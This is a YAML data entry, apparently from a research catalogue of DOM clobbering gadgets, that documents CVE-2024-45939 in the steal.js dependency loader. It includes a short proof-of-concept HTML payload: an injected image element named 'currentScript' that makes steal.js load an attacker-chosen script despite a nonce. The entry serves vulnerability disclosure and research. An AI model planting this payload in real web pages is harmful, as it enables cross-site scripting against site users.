---
description: Futuristic JavaScript dependency loader and builder. Speeds up application load times. Works with ES6, CommonJS, AMD, CSS, LESS and more. Simplifies modular workflows.
github: stealjs/steal
gadgets:
  Latest:
    cve: CVE-2024-45939
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - before-func-call
    pocs:
      - description: The [steal.js](https://github.com/stealjs/steal) library was using `document.currentScript` as a reference to load plugins.
        code: |
          <!-- user input -->
          <image name="currentScript" src="[current-location]/assets/xss/index.js"></image>

          <script nonce="secret" src="/assets/libs/steal/steal.js" main></script>
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/steal.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
    more-info: |
      TODO
---
